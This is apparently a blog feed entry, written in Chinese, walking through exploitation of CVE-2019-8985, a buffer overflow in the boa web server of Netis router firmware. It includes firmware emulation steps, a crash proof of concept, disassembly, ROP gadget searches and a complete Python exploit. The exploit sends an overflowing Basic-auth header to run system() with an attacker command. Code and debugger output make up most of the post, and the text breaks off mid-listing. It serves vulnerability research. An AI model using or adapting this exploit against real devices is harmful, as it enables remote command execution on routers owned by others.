{
    "version": "https://jsonfeed.org/version/1",
    "title": "Squirre17 Blog • All posts by \"iot\" tag",
    "description": "introvert",
    "home_page_url": "https://Squirre17.github.io",
    "items": [
        {
            "id": "https://squirre17.github.io/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/",
            "url": "https://squirre17.github.io/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/",
            "title": "CVE–2019–8985 Netis WF2411 RCE detail",
            "date_published": "2021-08-10T16:00:00.000Z",
            "content_html": "<h2 id=\"环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#环境搭建\">#</a> 环境搭建</h2>\n<p>固件获取  <a href=\"https://www.netis-systems.com/Suppory/de_details/id/1/de/168.html\">WF2419</a><br>\n<a href=\"https://www.tacnetsol.com/blog/cve-2019-8985-rce\">Fetching Title#sw0w</a><br>\n 选择 WF2419（2.2.36123）</p>\n<p>先逆向分析 <code>boa</code> <br>\n 漏洞点</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">loc_4145D8:              <span class=\"meta\"># s</span></span><br><span class=\"line\">addiu   $a0, $sp, <span class=\"number\">0x60</span>+var_40</span><br><span class=\"line\">li      $a1, <span class=\"number\">0x420000</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">addiu   $a1, (aSS_0 - <span class=\"number\">0x420000</span>)  # <span class=\"string\">&quot;%s:%s&quot;</span></span><br><span class=\"line\">move    $a2, $s0</span><br><span class=\"line\">move    $a3, $s4</span><br><span class=\"line\">la      $t9, <span class=\"built_in\">sprintf</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">jalr    $t9 ; <span class=\"built_in\">sprintf</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">lw      $gp, <span class=\"number\">0x60</span>+var_48($sp)</span><br><span class=\"line\">nop</span><br><span class=\"line\">li      $s3, <span class=\"number\">0x460000</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">addiu   $s3, (byte_4596D0 - <span class=\"number\">0x460000</span>)</span><br><span class=\"line\">lbu     $v0, <span class=\"number\">0x60</span>+var_40($sp)</span><br><span class=\"line\">nop</span><br><span class=\"line\">addiu   $s2, $v0, <span class=\"number\">-0x3A</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">user_ok</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *a1, <span class=\"type\">const</span> <span class=\"type\">char</span> *a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// $s1</span></span><br><span class=\"line\">  <span class=\"type\">int</span> result; <span class=\"comment\">// $v0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// $s2</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v7; <span class=\"comment\">// $v0</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *v8; <span class=\"comment\">// $s0</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> v9; <span class=\"comment\">// dc</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v10[<span class=\"number\">64</span>]; <span class=\"comment\">// [sp+20h] [-40h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v10, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v10));</span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( get_password(<span class=\"number\">64</span>) &gt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">sprintf</span>(v10, <span class=\"string\">&quot;%s:%s&quot;</span>, a1, a2);</span><br><span class=\"line\">    v6 = (<span class=\"type\">unsigned</span> __int8)v10[<span class=\"number\">0</span>] - <span class=\"number\">58</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v7 = v4 &lt;&lt; <span class=\"number\">6</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( byte_4596D0[<span class=\"number\">64</span> * v4] == <span class=\"number\">58</span> &amp;&amp; !v6 )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      v8 = &amp;byte_4596D0[v7];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>(&amp;byte_4596D0[v7]) &gt;= <span class=\"number\">2</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v9 = <span class=\"built_in\">strcmp</span>(v10, v8) == <span class=\"number\">0</span>;</span><br><span class=\"line\">        result = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v9 )</span><br><span class=\"line\">          <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( ++v4 &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;check password error,log_passwd=%s;passwd=%s\\n&quot;</span>, a2, byte_4596D0);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;%s:%s:%d;get password error!\\n&quot;</span>, <span class=\"string\">&quot;htauth.c&quot;</span>, <span class=\"string\">&quot;user_ok&quot;</span>, <span class=\"number\">74</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>启动 boa 的时候可以检查下配置文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  sqrootfs file bin/busybox         </span><br><span class=\"line\">bin/busybox: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class=\"line\">➜  sqrootfs cp $(which qemu-mips) .</span><br><span class=\"line\">➜  sqrootfs grep -r &quot;boa -&quot; .                   </span><br><span class=\"line\">./bin/webs:\t/bin/boa -p /web -f /etc/boa.conf &amp;</span><br><span class=\"line\">grep: ./var/run/webs.pid: Permission denied</span><br><span class=\"line\">➜  sqrootfs sudo chroot . ./qemu-mips /bin/boa -p /web -f /etc/boa.conf</span><br><span class=\"line\">[sudo] password for squ: </span><br><span class=\"line\">Starting Protocol Module: HTTP Server                      ... OK</span><br></pre></td></tr></table></figure>\n<p>如果出现不能缺失 <code>/dev/null</code>  的问题<br>\n可以 <code>sudo mknod -m 666 dev/null c 1 3</code> <br>\n 如果出现 <code>can't create PID file</code> <br>\n 可以 <code>md var/run</code></p>\n<p>然后可以打个 PoC 试试看</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget --http-user=a --http-password=$(python -c &#x27;print &quot;a&quot;*0x80&#x27;) http://127.0.0.1</span><br></pre></td></tr></table></figure>\n<p>可以看到报错信息如下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">translate_uri:222;Wget/1.19.4 (linux-gnu)</span><br><span class=\"line\">translate_uri:254</span><br><span class=\"line\">translate_uri:256</span><br><span class=\"line\">htauth.c:user_auth:181;get password error!</span><br></pre></td></tr></table></figure>\n<p>✨TODO</p>\n<p>逆向一下可以发现要打开一个 passwd</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v2 = fopen(<span class=\"string\">&quot;/tmp/passwd&quot;</span>, <span class=\"string\">&quot;r+&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>cp 本地的过去</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /etc/passwd ./tmp</span><br></pre></td></tr></table></figure>\n<p>在 wget 一下 可以看到崩溃</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">check password error,log_passwd=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;passwd=root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">caught SIGSEGV, dumping core in /var/boa</span><br><span class=\"line\">qemu: uncaught target signal 6 (Aborted) - core dumped</span><br><span class=\"line\">[1]    49014 abort      sudo chroot . ./qemu-mips /bin/boa -p /web -f /etc/boa.conf</span><br></pre></td></tr></table></figure>\n<h2 id=\"漏洞分析\"><a class=\"markdownIt-Anchor\" href=\"#漏洞分析\">#</a> 漏洞分析</h2>\n<p><code>ra</code>  在  <code>sp + 0x14</code> <br>\n <code>buf</code>  在  <code>sp - 0x40</code> <br>\n 也就是 <code>0x54</code>  的 offs<br>\n 同时我们也需要控制五个寄存器 <code>s0 ~ s5</code>  这五个调用者保存寄存器<br>\n这些寄存器主要是为了劫持返回地址 因为会有 sx 传递给 ax<br>\n 然后 jalr ax 的 gadget</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:<span class=\"number\">004146</span>DC                 lw      $ra, <span class=\"number\">0x60</span>+var_s14($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146E0</span>                 lw      $s4, <span class=\"number\">0x60</span>+var_s10($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146E4</span>                 lw      $s3, <span class=\"number\">0x60</span>+var_sC($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146E8</span>                 lw      $s2, <span class=\"number\">0x60</span>+var_s8($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146</span>EC                 lw      $s1, <span class=\"number\">0x60</span>+var_s4($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146F</span>0                 lw      $s0, <span class=\"number\">0x60</span>+var_s0($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146F</span>4                 jr      $ra</span><br><span class=\"line\">.text:<span class=\"number\">004146F</span>8                 addiu   $sp, <span class=\"number\">0x78</span></span><br></pre></td></tr></table></figure>\n<p>sprintf 的逆向语句如下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sprintf(dest, &quot;%s:%s&quot;, username, password);</span><br></pre></td></tr></table></figure>\n<p><code>boa</code>  has two loaded libraries,  <code>libC</code>  and  <code>libgcc</code> .</p>\n<p>审视一波 libc.so.0</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">Python&gt;</span><span class=\"language-bash\">mipsrop.stackfinder()</span></span><br><span class=\"line\">----------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class=\"line\">----------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\">|  0x000068AC  |  addiu $a0,$sp,0x20+var_8                            |  jalr  $v0                             |</span><br><span class=\"line\">|  0x0000711C  |  addiu $a0,$sp,0x1A0+var_188                         |  jalr  $v0                             |</span><br><span class=\"line\">|  0x000074BC  |  addiu $a0,$sp,0x1A0+var_188                         |  jalr  $v0                             |</span><br><span class=\"line\">|  0x00020660  |  addiu $a0,$sp,0x30+var_18                           |  jalr  $a0                             |</span><br><span class=\"line\">|  0x000071E4  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class=\"line\">|  0x00008AD4  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class=\"line\">|  0x0000A3CC  |  addiu $a2,$sp,0x40+var_28                           |  jr    0x40+var_sC($sp)                |</span><br><span class=\"line\">|  0x000125E0  |  addiu $a2,$sp,0x18+arg_8                            |  jr    0x18+var_s0($sp)                |</span><br></pre></td></tr></table></figure>\n<p>没有可用的 gadget<br>\n 再到 libgcc 中找 第二列有 a0 第三列有 s0 ~ s4 就行<br>\n找到这个 也就是要确保</p>\n<ul>\n<li>binsh 地址在 sp + 0x18 (但这个是在执行了 <code>addiu   $sp, 0x78</code>  之后的)</li>\n<li>而 system 在 s3 （sp + 0xc）</li>\n<li>ra 在 sp +0x14</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000ABD0                 addiu   $a0, $sp, 0x20+var_8</span><br><span class=\"line\">.text:0000ABD4                 move    $a1, $s2</span><br><span class=\"line\">.text:0000ABD8                 move    $s0, $zero</span><br><span class=\"line\">.text:0000ABDC                 move    $t9, $s3</span><br><span class=\"line\">.text:0000ABE0                 jalr    $t9</span><br><span class=\"line\">.text:0000ABE4                 movz    $s0, $v0, $v1</span><br></pre></td></tr></table></figure>\n<p>在 qemu 内模拟</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">vmmap</span></span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">  0x400000   0x419000 r-xp    19000 0      /bin/boa</span><br><span class=\"line\">  0x459000   0x45a000 rw-p     1000 19000  /bin/boa</span><br><span class=\"line\">  0x45a000   0x466000 rwxp     c000 0      [heap]</span><br><span class=\"line\">0x77ee2000 0x77eee000 r-xp     c000 0      /lib/libgcc_s_4181.so.1</span><br><span class=\"line\">0x77eee000 0x77f2d000 ---p    3f000 0      [anon_77eee]</span><br><span class=\"line\">0x77f2d000 0x77f2e000 rw-p     1000 b000   /lib/libgcc_s_4181.so.1</span><br><span class=\"line\">0x77f2e000 0x77f6c000 r-xp    3e000 0      /lib/libc.so.0</span><br><span class=\"line\">0x77f6c000 0x77fac000 ---p    40000 0      [anon_77f6c]</span><br><span class=\"line\">0x77fac000 0x77fad000 rw-p     1000 3e000  /lib/libc.so.0</span><br><span class=\"line\">0x77fad000 0x77fb1000 rw-p     4000 0      [anon_77fad]</span><br><span class=\"line\">0x77fb1000 0x77fb7000 r-xp     6000 0      /lib/ld-uClibc.so.0</span><br><span class=\"line\">0x77ff5000 0x77ff6000 rw-p     1000 0      [anon_77ff5]</span><br><span class=\"line\">0x77ff6000 0x77ff7000 r--p     1000 5000   /lib/ld-uClibc.so.0</span><br><span class=\"line\">0x77ff7000 0x77ff8000 rw-p     1000 6000   /lib/ld-uClibc.so.0</span><br><span class=\"line\">0x7f9ee000 0x7fff7000 rwxp   609000 0      [stack]</span><br><span class=\"line\">0x7fff7000 0x7fff8000 r-xp     1000 0      [vdso]</span><br></pre></td></tr></table></figure>\n<p>gdb 定位到地址<br>\n<img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220718180751.png\" alt><br>\n可以看到由于 boa 的限制 ✨TODO<br>\n 我们只溢出了 17 个 cmd 的字节命令<br>\n而 cmd 需要放在 <code>0x40800368</code>  的位置 也就是 esp + 0x18  <code>0x40800350 + 0x18</code></p>\n<p>从这一段可以看出</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">► 0x4146dc &lt;user_ok+460&gt;    lw     $ra, 0x74($sp)                &lt;0x4146cc&gt;</span><br><span class=\"line\">  0x4146e0 &lt;user_ok+464&gt;    lw     $s4, 0x70($sp)</span><br><span class=\"line\">  0x4146e4 &lt;user_ok+468&gt;    lw     $s3, 0x6c($sp)</span><br><span class=\"line\">  0x4146e8 &lt;user_ok+472&gt;    lw     $s2, 0x68($sp)</span><br><span class=\"line\">  0x4146ec &lt;user_ok+476&gt;    lw     $s1, 0x64($sp)</span><br><span class=\"line\">  0x4146f0 &lt;user_ok+480&gt;    lw     $s0, 0x60($sp)</span><br><span class=\"line\">  0x4146f4 &lt;user_ok+484&gt;    jr     $ra</span><br></pre></td></tr></table></figure>\n<p>ra 在 sp + 0x74 的位置<br>\n而 jr 之前会做一次 <code>.text:004146F8                 addiu   $sp, 0x78</code> <br>\n 而 gadget 里的 cmd 地址是 <code>addiu   $a0, $sp, 0x20+var_8</code> <br>\n 也就是放在 ra 上  <code>0x78 - 0x74 + 0x18</code>  =  <code>0x1c</code>  的位置</p>\n<p>exp 如下<br>\n s3 的位置是 <code>sp + 0x6c</code>  溢出点离 s0 是  <code>0x40</code> <br>\n 所以溢出点离 s3 是 <code>0x4c</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">libc   \t= <span class=\"number\">0x77f2e000</span> </span><br><span class=\"line\">libgcc \t= <span class=\"number\">0x77ee2000</span></span><br><span class=\"line\">gadget \t= <span class=\"number\">0x0000ABD0</span> + libgcc</span><br><span class=\"line\">system\t= <span class=\"number\">0x0002AC90</span> + libc</span><br><span class=\"line\">MAXSZ\t= <span class=\"number\">1024</span></span><br><span class=\"line\"><span class=\"comment\"># cmd\t\t= b&quot;FUCK&quot; * 50 # 看看长度</span></span><br><span class=\"line\">cmd\t\t= <span class=\"string\">b&quot;mkdir hack&quot;</span></span><br><span class=\"line\">context(arch = <span class=\"string\">&quot;mips&quot;</span>, endian = <span class=\"string\">&quot;big&quot;</span>, os = <span class=\"string\">&quot;Linux&quot;</span>, log_level = <span class=\"string\">&quot;DEBUG&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># fork 0x77f34d30</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] gadget is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(gadget)&#125;</span>&quot;</span>)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] system is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class=\"line\">\tpayload  = <span class=\"string\">b&#x27;a:%s&#x27;</span> %(<span class=\"string\">b&#x27;A&#x27;</span> * (<span class=\"number\">0x4C</span> - <span class=\"number\">2</span>)) <span class=\"comment\"># padding + s0~s2</span></span><br><span class=\"line\">\tpayload += p32(system)\t\t\t\t\t<span class=\"comment\"># s3 &lt;- esp + 0x0c</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&#x27;AAAA&#x27;</span>\t\t\t\t\t\t<span class=\"comment\"># s4 </span></span><br><span class=\"line\">\tpayload += p32(gadget) \t\t\t\t\t<span class=\"comment\"># ra &lt;- esp + 0x14</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += cmd  \t\t\t\t\t\t<span class=\"comment\"># \t &lt;- esp + 0x30</span></span><br><span class=\"line\"></span><br><span class=\"line\">\theader   = <span class=\"string\">b&#x27;GET / HTTP/1.1\\r\\n&#x27;</span></span><br><span class=\"line\">\t<span class=\"comment\"># header  += b&#x27;Host: 127.0.0.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Host: 10.10.10.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Authorization: Basic %s\\r\\n&#x27;</span> % base64.b64encode(payload)</span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;User-Agent: Real UserAgent\\r\\n\\r\\n&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">\tiport = (<span class=\"string\">&quot;10.10.10.1&quot;</span> ,<span class=\"number\">80</span>)</span><br><span class=\"line\">\t<span class=\"comment\"># iport = (&quot;127.0.0.1&quot; ,80)</span></span><br><span class=\"line\">\ts.connect(iport)</span><br><span class=\"line\">\ts.send(header)</span><br><span class=\"line\">\tmsg = s.recv(MAXSZ)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] Message is %s&quot;</span> %(msg))</span><br><span class=\"line\">\ts.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\texp()</span><br></pre></td></tr></table></figure>\n<p>gdb 调试脚本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set arch mips</span><br><span class=\"line\">set endian big</span><br><span class=\"line\">set solib-search-path sqrootfs/lib/</span><br><span class=\"line\">b *0x4146f4</span><br><span class=\"line\">target remote 10.10.10.1:8888</span><br></pre></td></tr></table></figure>\n<p>程序是 chroot 到 /web 页面下了 所以 mkdir 是在 web 下<br>\n<img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/2.png\" alt></p>\n<p>17 个字节的溢出是很难造成反向 shell 的 也就只能造成一次 17 字节的任意命令执行<br>\n重新考虑 rop</p>\n<h2 id=\"更好的rop\"><a class=\"markdownIt-Anchor\" href=\"#更好的rop\">#</a> 更好的 ROP</h2>\n<p>目标 让最后的 a0 尽可能的接近 sp 的位置<br>\n已知在 vuln 函数最后 jalr ra 之后 sp 是在 ra 上 4 字节</p>\n<h3 id=\"gadget2\"><a class=\"markdownIt-Anchor\" href=\"#gadget2\">#</a> gadget2</h3>\n<p>从 ra 开始到 cmd 结束 有 40 个字节的空区<br>\n要充分利用这 40 字节 就需要降低 esp<br>\n 在 libc 中找到此 gadget<br>\n <code>sp - 0x38 + 0x30 - 0x18 = sp - 0x20</code>  的值给 <code>a0</code>  寄存器<br>\n然后跳到 先前的 <code>a0</code>  里面去<br>\n但是有个问题  <code>sp-0x20</code>  是在 saved 寄存器存放的地方 肯定是很难布置过长的 cmd<br>\n 而且 <code>a0</code>  不可控 我们需要让 <code>a0</code>  可控</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00020650                 addiu   $sp, -0x38</span><br><span class=\"line\">.text:00020654                 sw      $ra, 0x30+var_s0($sp)</span><br><span class=\"line\">.text:00020658                 sw      $gp, 0x30+var_20($sp)</span><br><span class=\"line\">.text:0002065C                 li      $v0, 2</span><br><span class=\"line\">.text:00020660                 move    $t9, $a0</span><br><span class=\"line\">.text:00020664                 sw      $v0, 0x30+var_18($sp)</span><br><span class=\"line\">.text:00020668                 jalr    $t9</span><br><span class=\"line\">.text:0002066C                 